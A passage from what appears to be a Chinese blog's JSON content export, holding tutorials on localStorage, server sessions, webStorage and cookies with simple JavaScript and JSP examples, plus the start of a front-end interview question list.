另外，存储的是int类型，但打印的是string类型，这与localStorage本身的特点有关，localStorage只支持string类型的存储。 六、localStorage读取(三种方法)： 1234567891011121314151617if(!window.localStorage)&#123; alert(\"浏览器不支持localstorage\");&#125;else&#123; var storage=window.localStorage; storage[\"a\"]=1; //写入a字段 storage.b=1; //写入b字段 storage.setItem(\"c\",3); //写入c字段 console.log(typeof storage[\"a\"]); console.log(typeof storage[\"b\"]); console.log(typeof storage[\"c\"]); var a=storage.a; //第一种方法读取 console.log(a); var b=storage[\"b\"]; //第二种方法读取 console.log(b); var c=storage.getItem(\"c\"); //第三种方法读取 console.log(c);&#125; 七、localStorage改： 123456789if(!window.localStorage)&#123; alert(\"浏览器不支持localstorage\");&#125;else&#123; var storage=window.localStorage; storage.setItem(\"c\",3); console.log(storage.c); storage.c=4; console.log(storage.c);&#125; 八、localStorage删： 将localStorage的所有内容清除 123456var storage=window.localStorage;storage.a=1;storage.setItem(\"c\",3);console.log(storage);storage.clear();console.log(storage); 将localStorage中的某个键值对删除 123456var storage=window.localStorage;storage.a=1;storage.setItem(\"c\",3);console.log(storage);storage.removeItem(\"a\");console.log(storage.a); 九、localStorage键获取： 1234567var storage=window.localStorage;storage.a=1;storage.setItem(\"c\",3);for(var i=0;i&lt;storage.length;i++)&#123; var key=storage.key(i); //key()方法 console.log(key);&#125; 十、localStorage存取json数据： 使用JSON.stringify()这个方法，将JSON转换成为JSON字符串 12345678910111213if(!window.localStorage)&#123; alert(\"浏览器不支持localstorage\");&#125;else&#123; var storage=window.localStorage; var data=&#123; name:'xiecanyong', sex:'man', hobby:'program' &#125;; var d=JSON.stringify(data); storage.setItem(\"data\",d); console.log(storage.data);&#125; 读取之后要将JSON字符串转换成为JSON对象，使用JSON.parse()方法 1234567891011var storage=window.localStorage;var data=&#123; name:'xiecanyong', sex:'man', hobby:'program'&#125;;var d=JSON.stringify(data);storage.setItem(\"data\",d);var json=storage.getItem(\"data\");var jsonObj=JSON.parse(json);console.log(typeof jsonObj); 其他类型的也要进行转换 标注： 参考资料1：http://www.cnblogs.com/st-leslie/p/5617130.html","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-JS","slug":"前端-JS","permalink":"http://liuxuewen-site.github.io/tags/前端-JS/"}]},{"title":"服务器端数据存储方式：session","slug":"BG-bs-session","date":"2018-01-30T07:43:58.000Z","updated":"2018-07-03T17:08:00.563Z","comments":true,"path":"2018/01/30/BG-bs-session/","link":"","permalink":"http://liuxuewen-site.github.io/2018/01/30/BG-bs-session/","excerpt":"","text":"一、session &emsp;&emsp;客户端浏览器与服务器之间一系列交互的动作称为一个 Session。 &emsp;&emsp;Session是另一种记录客户状态的机制，不同于Cookie的是cookie保存在客户端浏览器中，而Session保存在服务器上。 &emsp;&emsp;客户端浏览器访问服务器的时候，服务器创建session，把客户端信息以某种形式记录在服务器上，同时，服务器会为该Session生成唯一的Session id，这个Session id在随后的请求中会被用来重新获得已经创建的Session。 &emsp;&emsp;在Session被创建之后，就可以调用Session相关的方法往Session中增加内容了，而这些内容只会保存在服务器中，发到客户端的只有Session id；当客户端再次发送请求的时候，会将这个Session id带上，服务器接受到请求之后就会依据Session id找到相应的Session，从而再次使用之。 &emsp;&emsp;如果说Cookie机制是通过检查客户身上的“通行证”来确定客户身份的话，那么Session机制就是通过检查服务器上的“客户明细表”来确认客户身份。Session相当于程序在服务器上建立的一份客户档案，客户来访的时候只需要查询客户档案表就可以了。 &emsp;&emsp;session可应用于记录用户登录状态（session的使用更多涉及后台，具体代码的应用此处不给例子）。 二、session生命周期 &emsp;&emsp;为了获得更高的存取速度，服务器一般把Session放在内存里。每个用户都会有一个独立的Session。如果Session内容过于复杂，当大量客户访问服务器时可能会导致内存溢出。因此，Session里的信息应该尽量精简。 &emsp;&emsp;Session在用户第一次访问服务器的时候自动创建。需要注意只有访问JSP、Servlet等程序时才会创建Session，只访问HTML、IMAGE等静态资源并不会创建Session。如果尚未生成Session，也可以使用request.getSession(true)强制生成Session。 &emsp;&emsp;Session生成后，只要用户继续访问，服务器就会更新Session的最后访问时间，并维护该Session。用户每访问服务器一次，无论是否读写Session，服务器都认为该用户的Session“活跃（active）”了一次。 三、session有效期 &emsp;&emsp;由于会有越来越多的用户访问服务器，因此Session也会越来越多。为防止内存溢出，服务器会把长时间内没有活跃的Session从内存删除。这个时间就是Session的超时时间。如果超过了超时时间没访问过服务器，Session就自动失效了。 &emsp;&emsp;Session的超时时间为maxInactiveInterval属性，可以通过对应的getMaxInactiveInterval()获取，通过setMaxInactiveInterval(longinterval)修改。 &emsp;&emsp;Session的超时时间也可以在web.xml中修改。另外，通过调用Session的invalidate()方法可以使Session失效。 三、session常用方法 &emsp;&emsp;1、void setAttribute(String attribute, Object value)：设置Session属性，value参数可以为任何Java Object，通常为Java Bean，value信息不宜过大。 &emsp;&emsp;2、String getAttribute(String attribute)：返回Session属性。 &emsp;&emsp;3、Enumeration getAttributeNames()：返回Session中存在的属性名。 &emsp;&emsp;4、void removeAttribute(String attribute)：移除Session属性。 &emsp;&emsp;5、String getId()：返回Session的ID。该ID由服务器自动创建，不会重复。 &emsp;&emsp;6、long getCreationTime()：返回Session的创建日期。返回类型为long，常被转化为Date类型，例如：Date createTime = new Date(session.getCreationTime())。 &emsp;&emsp;6、long getLastAccessedTime()：返回Session的最后活跃时间。返回类型为long int。 &emsp;&emsp;7、getMaxInactiveInterval()：返回Session的超时时间。单位为秒。超过该时间没有访问，服务器认为该Session失效。 &emsp;&emsp;8、void setMaxInactiveInterval(int second)：设置Session的超时时间。单位为秒。 &emsp;&emsp;9、void putValue(String attribute, Object value)：不推荐的方法。已经被setAttribute(String attribute, Object Value)替代。 &emsp;&emsp;10、Object getValue(String attribute)：不被推荐的方法。已经被getAttribute(String attr)替代。 &emsp;&emsp;11、boolean isNew()：返回该Session是否是新创建的。 &emsp;&emsp;12、void invalidate()：使该Session失效。 四、Session对浏览器的要求 &emsp;&emsp;虽然Session保存在服务器，对客户端是透明的，但它的正常运行仍然需要客户端浏览器的支持。因为Session需要使用Cookie作为识别标志。HTTP协议是无状态的，Session不能依据HTTP连接来判断是否为同一客户，因此服务器向客户端浏览器发送一个名为JSESSIONID的Cookie，它的值为该Session的id（也就是HttpSession.getId()的返回值）。Session依据该Cookie来识别是否为同一用户。 &emsp;&emsp;该Cookie为服务器自动生成的，它的maxAge属性一般为–1，表示仅当前浏览器内有效，并且各浏览器窗口间不共享，关闭浏览器就会失效。因此同一机器的两个浏览器窗口访问服务器时，会生成两个不同的Session。但是由浏览器窗口内的链接、脚本等打开的新窗口（也就是说不是双击桌面浏览器图标等打开的窗口）除外。这类子窗口会共享父窗口的Cookie，因此会共享一个Session。 &emsp;&emsp;在谈论session机制的时候，常常听到这样一种误解“只要关闭浏览器，session就消失了”。其实可以想象一下会员卡的例子，除非顾客主动对店家提出销卡，否则店家绝对不会轻易删除顾客的资料。对session来说也是一样的，除非程序通知服务器删除一个session，否则服务器会一直保留，程序一般都是在用户做log off的时候发个指令去删除session。然而浏览器从来不会主动在关闭之前通知服务器它将要关闭，因此服务器根本不会有机会知道浏览器已经关闭，之所以会有这种错觉，是大部分session机制都使用会话cookie来保存session id，而关闭浏览器后这个 session id就消失了，再次连接服务器时也就无法找到原来的session。如果服务器设置的cookie被保存到硬盘上，或者使用某种手段改写浏览器发出的HTTP请求头，把原来的session id发送给服务器，则再次打开浏览器仍然能够找到原来的session。恰恰是由于关闭浏览器不会导致session被删除，迫使服务器为seesion设置了一个失效时间，当距离客户端上一次使用session的时间超过这个失效时间时，服务器就可以认为客户端已经停止了活动，才会把session删除以节省存储空间。 &emsp;&emsp;如果客户端浏览器将Cookie功能禁用，或者不支持Cookie怎么办？例如，绝大多数的手机浏览器都不支持Cookie。Java Web提供了另一种解决方案：URL地址重写。 五、URL地址重写 &emsp;&emsp;URL地址重写的原理是将该用户Session的id信息重写到URL地址中。服务器能够解析重写后的URL获取Session的id。这样即使客户端不支持Cookie，也可以使用Session来记录用户状态。 1234&lt;td&gt; &lt;a href=\"&lt;%=response.encodeURL(\"index.jsp?c=1&amp;wd=Java\") %&gt;\"&gt; Homepage&lt;/a&gt;&lt;/td&gt; &emsp;&emsp;该方法会自动判断客户端是否支持Cookie。如果客户端支持Cookie，会将URL原封不动地输出来。如果客户端不支持Cookie，则会将用户Session的id重写到URL中。重写后的输出可能是这样的： 123&lt;td&gt; &lt;a href=\"index.jsp;jsessionid=0CCD096E7F8D97B0BE608AFDC3E1931E?c=1&amp;wd=Java\"&gt;Homepage&lt;/a&gt;&lt;/td&gt; 六、Session中禁止使用Cookie &emsp;&emsp;既然WAP上大部分的客户浏览器都不支持Cookie，索性禁止Session使用Cookie，统一使用URL地址重写会更好一些。Java Web规范支持通过配置的方式禁用Cookie。 &emsp;&emsp;打开项目的WebRoot目录下的META-INF文件夹（跟WEB-INF文件夹同级，如果没有则创建），打开context.xml（如果没有则创建），编辑内容如下： /META-INF/context.xml： 123&lt;?xml version='1.0' encoding='UTF-8'?&gt; &lt;Context path=\"/sessionWeb\"cookies=\"false\"&gt;&lt;/Context&gt; &emsp;&emsp;或者修改Tomcat全局的conf/context.xml，修改内容如下： context.xml： 1234&lt;!-- The contents of this file will be loaded for eachweb application --&gt;&lt;Context cookies=\"false\"&gt; &lt;!-- ... 中间代码略 --&gt;&lt;/Context&gt; &emsp;&emsp;部署后TOMCAT便不会自动生成名JSESSIONID的Cookie，Session也不会以Cookie为识别标志，而仅仅以重写后的URL地址为识别标志了。 &emsp;&emsp;注意：该配置只是禁止Session使用Cookie作为识别标志，并不能阻止其他的Cookie读写。也就是说服务器不会自动维护名为JSESSIONID的Cookie了，但是程序中仍然可以读写其他的Cookie。 七、Cookie与Session的区别 &emsp;&emsp;1、cookie数据存放在客户的浏览器上，session数据放在服务器上； &emsp;&emsp;2、cookie不是很安全，别人可以分析存放在本地的COOKIE并进行COOKIE欺骗，考虑到安全应当使用session； &emsp;&emsp;3、session会在一定时间内保存在服务器上。当访问增多，会比较占用你服务器的性能。考虑到减轻服务器性能方面，应当使用COOKIE； &emsp;&emsp;4、单个cookie在客户端的限制是4K，就是说一个站点在客户端存放的COOKIE不能超过4K。 标注： 参考资料1：https://www.cnblogs.com/andy-zhou/p/5360107.html","categories":[{"name":"后台","slug":"后台","permalink":"http://liuxuewen-site.github.io/categories/后台/"}],"tags":[{"name":"后台","slug":"后台","permalink":"http://liuxuewen-site.github.io/tags/后台/"}]},{"title":"客户端数据存储方式：webStorage","slug":"JS-bs-webStorage","date":"2018-01-30T06:51:10.000Z","updated":"2018-07-03T17:34:35.937Z","comments":true,"path":"2018/01/30/JS-bs-webStorage/","link":"","permalink":"http://liuxuewen-site.github.io/2018/01/30/JS-bs-webStorage/","excerpt":"","text":"一、webStorage前景 &emsp;&emsp;HTML5出现前，若开发者需要在客户端存储少量的数据，只能通过cookie实现，但是cookie存在几个不足： &emsp;&emsp;1、每个域名下cookie的大小限制在4KB。 &emsp;&emsp;2、cookie会包含在每个http请求中，这样会导致发送重复的数据。 &emsp;&emsp;3、cookie在网络传输过程中没有加密，存在安全隐患。 &emsp;&emsp;在HTML5新增了Web storage功能，Web Storage官方建议为每个网站是5MB，能存储比cookie更多的数据，并且具有比cookie更强大的功能。Web Storage现在已经得到了Firefox、Opera、Chrome、Safari各主流浏览器的支持。 &emsp;&emsp;Web Storage 的目的是克服由cookie带来的一些限制，当数据需要被严格控制在客户端时，无需持续的将数据发回服务器使用（前端控制）。 二、webStorage简介 Web Storage又分为Session Storage和Local Storage，他们都只能读写当前域的数据： Session Storage：与session类似，Session Storage保存的数据生存期限与Session期限相同，用户Session结束时，Session Storage保存的数据也就消失了。 Local Storage： Local Storage保存的数据一直在本地，除非用户或程序显式地清楚，否则这些数据会一致存在。 三、webStorage方法 window对象中提供了sessionStorage和localStorage两个属性，这两个属性分别代表了Session Storage和Local Storage。这个两个功能和用法几乎是相同的，只是它们保存数据的生存期限不同而已。storage提供了以下属性和方法（以localStorage为例）： 123456•localStorage.length： 查；获取key-value对的数目；•localStorage.key(index)： 查；获取第index索引的key；•localStorage.getItem(key)： 读；获取指定key对应的value；•localStorage.setItem(key,value)：写；保存指定的key-value对；•localStorage.removeItem(key)： 删；删除指定key对应的key-value对；•localStorage.clear()： 删；删除所有key-value对。 需要注意的是，key和value都必须为字符串，换言之，web Storage的API只能操作字符串。那么一些不是字符串的数据，我们可以通过JSON等方式将其转化成字符串格式后在操作。 四、sessionStorage对用户访问页面的次数进行计数： 12345678910111213141516&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;body&gt;&lt;script type=\"text/javascript\"&gt;if (sessionStorage.pagecount)&#123; sessionStorage.pagecount=Number(sessionStorage.pagecount) +1;&#125;else&#123; sessionStorage.pagecount=1;&#125;document.write(\"Visits \" + sessionStorage.pagecount + \" time(s) this session.\");&lt;/script&gt; &lt;p&gt;刷新页面会看到计数器在增长。&lt;/p&gt;&lt;p&gt;请关闭浏览器窗口，然后再试一次，计数器已经重置了。&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 五、localStorage对用户访问页面的次数进行计数： 12345678910111213141516&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;body&gt;&lt;script type=\"text/javascript\"&gt;if (localStorage.pagecount)&#123; localStorage.pagecount=Number(localStorage.pagecount) +1;&#125;else&#123; localStorage.pagecount=1;&#125;document.write(\"Visits: \" + localStorage.pagecount + \" time(s).\");&lt;/script&gt; &lt;p&gt;刷新页面会看到计数器在增长。&lt;/p&gt;&lt;p&gt;请关闭浏览器窗口，然后再试一次，计数器会继续计数。&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 六、Web storage和cookie的比较： &emsp;&emsp;1、Web Storage的概念和cookie相似，区别是它是为了更大容量存储设计的。Cookie的大小是受限的，并且每次你请求一个新的页面的时候Cookie都会被发送过去，这样无形中浪费了带宽，另外cookie还需要指定作用域，不可以跨域调用。 &emsp;&emsp;2、除此之外，Web Storage拥有setItem,getItem,removeItem,clear等方法，不像cookie需要前端开发者自己封装setCookie，getCookie。 &emsp;&emsp;3、但是cookie也是不可以或缺的：cookie的作用是与服务器进行交互，作为HTTP规范的一部分而存在 ，而Web Storage仅仅是为了在本地“存储”数据而生。 标注： 本文综合多个网上教程所改","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-JS","slug":"前端-JS","permalink":"http://liuxuewen-site.github.io/tags/前端-JS/"}]},{"title":"客户端数据存储方式：Cookie","slug":"JS-bs-cookie","date":"2018-01-30T01:51:52.000Z","updated":"2018-07-03T17:53:42.620Z","comments":true,"path":"2018/01/30/JS-bs-cookie/","link":"","permalink":"http://liuxuewen-site.github.io/2018/01/30/JS-bs-cookie/","excerpt":"","text":"一、cookie基础 &emsp;&emsp;当一个用户通过 HTTP 协议访问一个服务器的时候，服务器会将一些 Key/Value 键值对返回给客户端浏览器，并给这些数据加上一些限制条件，在条件符合时这个用户下次访问这个服务器的时候，这些数据又被完整地带回给服务器。 &emsp;&emsp;Cookie是在客户端用于存储会话信息，其要求服务器对任意HTTP请求发送Set-Cookie HTTP头作为响应的一部分- -前端后台均可设置操作cookie。cookie以name为名称，以value为值（固定格式），名和值在传送时都必须是URL编码的。浏览器会存储这样的会话信息，在这之后，通过为每个请求添加Cookie HTTP头将信息发送回服务器。可以通过document.cookie属性来设置cookie。 &emsp;&emsp;cookie 是有大小限制的，每个 cookie 所存放的数据不能超过4kb，如果 cookie 字符串的长度超过4kb，则该属性将返回空字符串。typeof document.cookie是字符串不是array。 &emsp;&emsp;cookie 的存放，最终都是以文件形式存放在客户端计算机中，所以查看和修改 cookie 都是很方便的，这就是为什么常说 cookie 不能存放重要信息的原因。出于功能和性能的原因考虑，建议尽量降低 cookie 的使用数量，并且要尽量使用小 cookie。 &emsp;&emsp;cookie 是存在 有效期的。在默认情况下，一个 cookie 的生命周期就是在浏览器关闭的时候结束。如果想要 cookie 能在浏览器关掉之后还可以使用，就必须要为该 cookie 设置有效期，也就是 cookie 的失效日期。 &emsp;&emsp;cookie 存在两种类型：一是你浏览的当前网站本身设置的 cookie；二是来自在网页上嵌入广告或图片等其他域来源的 第三方 cookie (网站可通过使用这些 cookie 跟踪你的使用信息)。 &emsp;&emsp;浏览器可以通过设置来接受和拒绝访问 cookie。 二、cookie过程 &emsp;&emsp;一个cookie的设置以及发送过程分为以下四步： &emsp;&emsp;客户端发送一个http请求到服务器端 &emsp;&emsp;服务器端发送一个http响应到客户端，其中包含Set-Cookie头部 &emsp;&emsp;客户端发送一个http请求到服务器端，其中包含Cookie头部 &emsp;&emsp;服务器端发送一个http响应到客户端 三、cookie本质 &emsp;&emsp;cookie在本质上是http的一个扩展。有两个http头部是专门负责设置以及发送cookie的,它们分别是Set-Cookie以及Cookie。当服务器返回给客户端一个http响应信息时，其中如果包含Set-Cookie这个头部时，意思就是指示客户端建立一个cookie，并且在后续的http请求中自动发送这个cookie到服务器端，直到这个cookie过期。 &emsp;&emsp;如果cookie的生存时间是整个会话期间的话，那么浏览器会将cookie保存在内存中，浏览器关闭时就会自动清除这个cookie。另外一种情况就是保存在客户端的硬盘中，浏览器关闭的话，该cookie也不会被清除，下次打开浏览器访问对应网站时，这个cookie就会自动再次发送到服务器端。 四、Cookie的不可跨域名性 &emsp;&emsp;很多网站都会使用Cookie。例如，Google会向客户端颁发Cookie，Baidu也会向客户端颁发Cookie。那浏览器访问Google会不会也携带上Baidu颁发的Cookie呢？或者Google能不能修改Baidu颁发的Cookie呢？ &emsp;&emsp;答案是否定的。Cookie具有不可跨域名性。根据Cookie规范，浏览器访问Google只会携带Google的Cookie，而不会携带Baidu的Cookie。Google也只能操作Google的Cookie，而不能操作Baidu的Cookie。 &emsp;&emsp;Cookie在性质上是绑定在特定的域名下的，当设置了一个cookie后，再给创建它的域名发送请求时，都会包含这个cookie，这确保了储存在cookie中的信息智能让批准的接收者访问，而不能被其他域访问。 &emsp;&emsp;需要注意的是，虽然网站images.google.com与网站www.google.com同属于Google，但是域名不一样，二者同样不能互相操作彼此的Cookie。（用户登录网站www.google.com之后会发现访问images.google.com时登录信息仍然有效，而普通的Cookie是做不到的。这是因为Google做了特殊处理。） 五、cookie属性 &emsp;&emsp;String name：Cookie的名称。Cookie一旦创建，名称便不可更改。 &emsp;&emsp;Object value：Cookie的值。若为Unicode字符需要为字符编码。若为二进制数据则需要为BASE64编码。 &emsp;&emsp;int maxAge：Cookie失效的时间，单位秒。如果为正数，则该Cookie在&gt;maxAge秒之后失效。如果为负数，该Cookie为临时Cookie，关闭浏览器即失效，浏览器也不会以任何形式保存该Cookie。如果为0，表示删除该Cookie。默认为–1。 &emsp;&emsp;boolean secure：Cookie是否仅被使用安全协议传输。安全协议有HTTPS，SSL等，在网络上传输数据之前先将数据加密。默认为false。 &emsp;&emsp;String path：Cookie的使用路径。如果设置为“/sessionWeb/”，则只有contextPath为“/sessionWeb”的程序可以访问该Cookie。如果设置为“/”，则本域名下contextPath都可以访问该Cookie。注意最后一个字符必须为“/”。 &emsp;&emsp;String domain：可以访问该Cookie的域名。如果设置为“.google.com”，则所有以“google.com”结尾的域名都可以访问该Cookie。注意第一个字符必须为“.”。 &emsp;&emsp;String comment：Cookie的用处说明。浏览器显示Cookie信息的时候显示该说明。 &emsp;&emsp;int version：Cookie使用的版本号。0表示遵循Netscape的Cookie规范，1表示遵循W3C的RFC 2109规范。 五、cookie存取操作（js） 前端使用JavaScript存取 cookie 时必须要使用Document对象的 cookie 属性；后台的方式此处不做讲解。 创建和修改一个 cookie如下 ： 1 document.cookie = 'username=Darren' 以上代码中’username’表示 cookie 名称，’Darren’表示这个名称对应的值。假设 cookie 名称并不存在，那么就是创建一个新的 cookie；如果存在就是修改了这个 cookie 名称对应的值。如果要多次创建 cookie ，重复使用这个方法即可。 六、cookie读取操作（js） 如： 123456789101112function getCookie(c_name)&#123; if (document.cookie.length&gt;0)&#123; //查询cookie是否为空 c_start=document.cookie.indexOf(c_name + \"=\") //检查这个cookie是否存在 if (c_start!=-1)&#123; c_start=c_start + c_name.length+1 //获取cookie值的开始位置 c_end=document.cookie.indexOf(\";\",c_start) //获取cookie值的结束位置 if (c_end==-1) c_end=document.cookie.length return unescape(document.cookie.substring(c_start,c_end)) //通过substring()得到了值。想了解unescape()得先知道escape()是做什么的。 &#125; &#125; return \"\"&#125; 七、cookie设置有效期（js） 在默认的情况下，cookie 会在浏览器关闭的时候自动清除，但是我们可以通过expires来设置 cookie 的有效期。语法如下： 1document.cookie = \"name=value;expires=date\" 上面代码中的date值为GMT(格林威治时间)格式的日期型字符串，生成方式如下： 123var _date = new Date(); //通过new生成一个Date的实例，得到当前的时间；_date.setDate(_date.getDate()+30); //getDate()得到当前本地月份中的某一天，加上30即此cookie能在本地保存30天；接着通过setDate()方法来设置时间；_date.toGMTString(); //toGMTString()方法把Date对象转换为字符串，并返回结果 下面通过一个完整的函数来说明在创建 cookie 的过程中我们需要注意的地方。 123456function setCookie(c_name, value, expiredays)&#123; var exdate=new Date(); exdate.setDate(exdate.getDate() + expiredays); document.cookie=c_name+ \"=\" + escape(value) + ((expiredays==null) ? \"\" : \";expires=\"+exdate.toGMTString());&#125;使用方法：setCookie('username','Darren',30) 这个函数是按照天数来设置cookie的有效时间，如果想以其他单位（如：小时）来设置，那么改变第三行代码即可： 1exdate.setHours(exdate.getHours() + expiredays); 八、cookie清除操作（js） 1、通过浏览器工具清除 cookie (有第三方的工具，浏览器自身也有这种功能) 2、通过设置 cookie 的有效期来清除 cookie（把有效期的时间设置为一个已过期的时间） 注：cookie本身不提供删除修改操作，都是借用存取以及有效期间接设置。删除 cookie 有时可能导致某些网页无法正常运行 九、cookie高级之路径概念 &emsp;&emsp;cookie 一般都是由于用户访问页面而被创建的，可是并不是只有在创建 cookie 的页面才可以访问这个 cookie。 &emsp;&emsp;默认情况下，只有与创建 cookie 的页面在同一个目录或子目录下的网页才可以访问，这个是因为安全方面的考虑，造成不是所有页面都可以随意访问其他页面创建的 cookie。举个例子： 123\"http://www.cnblogs.com/Darren_code/\" 这个页面创建一个cookie，\"http://www.cnblogs.com/Darren_code/archive/2011/11/07/Cookie.html\"默认能取到cookie信息。\"http://www.cnblogs.com\" 或者 \"http://www.cnblogs.com/xxxx/\" 就不可以访问这个 cookie。 那么如何让这个 cookie 能被其他目录或者父级的目录访问类，通过设置 cookie 的路径就可以实现。例子如下： 12document.cookie = \"name=value;path=path\"document.cookie = \"name=value;expires=date;path=path\" path就是 cookie 的路径，最常用的例子就是让 cookie 在跟目录下,这样不管是哪个子页面创建的 cookie，所有的页面都可以访问到了,即: 1document.cookie = \"name=Darren;path=/\" 十、cookie高级之域概念 cookie 实现同域之间访问的问题。语法如下： 1document.cookie = \"name=value;path=path;domain=domain\" domain就是设置的 cookie 域的值。 例如 “www.qq.com&quot; 与 “sports.qq.com” 公用一个关联的域名”qq.com”，我们如果想让 “sports.qq.com” 下的cookie被 “www.qq.com&quot; 访问，我们就需要用到 cookie 的domain属性，并且需要把path属性设置为 “/“。例： 1document.cookie = \"username=Darren;path=/;domain=qq.com\" 注：一定的是同域之间的访问，不能把domain的值设置成非主域的域名。 十一、cookie高级之安全性 &emsp;&emsp;通常 cookie 信息都是使用HTTP连接传递数据，这种传递方式很容易被查看，所以 cookie 存储的信息容易被窃取。假如 cookie 中所传递的内容比较重要，那么就要求使用加密的数据传输。 &emsp;&emsp;cookie 的“secure”属性，默认的值为空。如果一个 cookie 的属性为secure，那么它与服务器之间就通过HTTPS或者其它安全协议传递数据。语法如下： 1document.cookie = \"username=Darren;secure\" &emsp;&emsp;把cookie设置为secure，只保证 cookie 与服务器之间的数据传输过程加密，而保存在本地的 cookie文件并不加密。如果想让本地cookie也加密，得自己加密数据。 &emsp;&emsp;注：就算设置了secure 属性也并不代表他人不能看到你机器本地保存的 cookie 信息，所以说到底，别把重要信息放cookie就对了…… 十二、cookie高级之编码细节 &emsp;&emsp;在输入cookie信息时不能包含空格，分号，逗号等特殊符号，而在一般情况下，cookie 信息的存储都是采用未编码的方式。所以，在设置 cookie 信息以前要先使用escape()函数将 cookie 值信息进行编码，在获取到 cookie 值得时候再使用unescape()函数把值进行转换回来。 1document.cookie = name + \"=\"+ escape (value) //设置cookie时 1return unescape(document.cookie.substring(c_start,c_end)) //获取cookie时 十三、cookie的优点 &emsp;&emsp;1、可配置到期规则： Cookie 可以在浏览器会话结束时到期，或者可以在客户端计算机上无限期存在，这取决于客户端的到期规则。 &emsp;&emsp;2、数据持久性： 虽然客户端计算机上 Cookie 的持续时间取决于客户端上的 Cookie 过期处理和用户干预，但Cookie 通常是客户端上持续时间最长的数据保留形式。 &emsp;&emsp;3、存储与发送：Cookie 存储在客户端并在发送后由服务器读取，cookie发送时是自动携带在请求里，不需要手动发送（localStorage需要）。 &emsp;&emsp;4、简单性： Cookie 是一种基于文本的轻量结构，包含简单的键值对。 十四、cookie的缺点 &emsp;&emsp;1、数量和长度的限制：每个域的cookie总数是有限的，IE6或更低版本最多20个cookie；IE7和之后的版本最后可以有50个；Firefox最多50个；chrome和Safari没有做硬性限制。cookie的长度也有限制，最好将cookie控制在4095B以内。否则会被截掉。 &emsp;&emsp;2、安全性问题： Cookie 把所有要保存的数据通过 HTTP 协议的头部从客户端传递到服务端，又从服务端再传回到客户端，所有的数据都存储在客户端的浏览器里，所以这些 Cookie 数据可以被访问到，如果cookie被人拦截了，那人就可以取得所有的信息。即使加密也与事无补，因为拦截者并不需要知道cookie的意义，他只要原样转发cookie就可以达到目的了。 &emsp;&emsp;3、性能问题：由于所有cookie都会由浏览器作为请求头发送，所以在cookie中存储大量信息会影响到特定域的请求性能. 十五、cookie的应用-记住登录信息 &emsp;&emsp;如果用户是在自己家的电脑上网，登录时就可以记住他的登录信息，下次访问时不需要再次登录，直接访问即可。实现方法是把登录信息如账号、密码等保存在Cookie中，并控制Cookie的有效期，下次访问时再验证Cookie中的登录信息即可。 &emsp;&emsp;保存登录信息有多种方案。最直接的是把用户名与密码都保持到Cookie中，下次访问时检查Cookie中的用户名与密码，与数据库比较。这是一种比较危险的选择，一般不把密码等重要信息保存到Cookie中。 &emsp;&emsp;另一种方案是把密码加密后保存到Cookie中，下次访问时解密并与数据库比较。这种方案略微安全一些。如果不希望保存密码，还可以把登录的时间戳保存到Cookie与数据库中，到时只验证用户名与登录时间戳就可以了。 标注： 本文综合多个网上教程所改","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-JS","slug":"前端-JS","permalink":"http://liuxuewen-site.github.io/tags/前端-JS/"}]},{"title":"前端基础考题1","slug":"frontEnd-basic1","date":"2018-01-29T13:32:46.000Z","updated":"2019-01-25T10:04:19.231Z","comments":true,"path":"2018/01/29/frontEnd-basic1/","link":"","permalink":"http://liuxuewen-site.github.io/2018/01/29/frontEnd-basic1/","excerpt":"","text":"一、浏览器页面有哪三层构成？分别是什么？作用是什么？ 构成：结构层、表示层、行为层 分别：HTML、CSS、JavaScript 作用：HTML实现页面结构，CSS完成页面的表现与风格，JavaScript实现一些客户端的功能与业务。 二、HTML文件里开头的Doctype的作用？严格模式与混杂模式如何区分？ 1）Doctype声明位于文档中的最前面的位置，处于标签之前。此标签可告知浏览器文档使用哪种 HTML 或 XHTML 规范。（重点：告诉浏览器按照何种规范解析页面，若无将使网页进入怪异模式） 2）标准模式是指浏览器按 W3C 标准解析执行代码。 3）怪异模式是指使用浏览器自己的方式解析执行代码，因为不同浏览器解析执行的方式不一样，所以我们称之为怪异模式。 4）严格模式是指浏览器根据web标准去解析页面，是一种要求严格的DTD(文档类型定义)，不允许使用任何表现层的语法。严格模式的排版和JS 运作模式是以该浏览器支持的最高标准运行。 5）混杂模式中页面以宽松的向后兼容的方式显示，模拟老式浏览器的行为以防止站点无法工作。 三、对WEB标准以及W3C的理解与认识? 1）什么是web标准：一系列标准的集合，包括结构化标准语言（html等）、表现标准语言（css）、行为标准语言（EMCAScript等）。这些标准大部分由万维网联盟起草和发布。 2）为什么使用web标准：为了解决因浏览器版本不同、软硬件设备不同导致的需多版本开发的问题。 3）W3C：万维网联盟，是一个web开发的国际性联盟。 4）标签闭合、标签小写、不乱嵌套、提高搜索机器人搜索几率、使用外链css和js脚本、结构行为表现的分离、文件下载与页面速度更快、内容能被更多的用户所访问、内容能被更广泛的设备所访问、更少的代码和组件，容易维护、改版方便，不需要变动页面内容、提供打印版本而不需要复制内容、提高网站易用性。 四、什么是HTML语义化? 1）HTML 语义化 &emsp;&emsp;根据内容的结构化（内容语义化），选择合适的标签（代码语义化），便于开发者阅读和写出更优雅的代码的同时，让浏览器的爬虫和机器很好地解析。 2）为什么要语义化 1、在没有CSS的情况下，页面也能呈现出很好地内容结构、代码结构； 2、增强用户体验，例如title、 alt 用于解释名词或解释图片信息； 3、有利于SEO，和搜索引擎建立良好沟通有助于爬虫抓取更多的有效信息（爬虫依赖于标签来确定上下文和各个关键字的权重）； 4、方便其他设备解析（如屏幕阅读器、盲人阅读器、移动设备），以意义的方式来渲染网页； 5、便于团队开发和维护，语义化更具可读性，是下一步网页的重要动向，遵循W3C标准的团队都遵循这个标准，可以减少差异化。 3）语义化标签 123456789&lt;header&gt;&lt;/header&gt;&lt;footer&gt;&lt;/footer&gt;&lt;nav&gt;&lt;/nav&gt;&lt;section&gt;&lt;/section&gt;&lt;article&gt;&lt;/article&gt; (用来在页面中表示一套结构完整且独立的内容部分)&lt;aslde&gt;&lt;/aside&gt; (主题的附属信息，若article 里为一篇文章，那么文章的作者以及信息内容就是这篇文章的附属内容)&lt;figure&gt;&lt;/figure&gt; 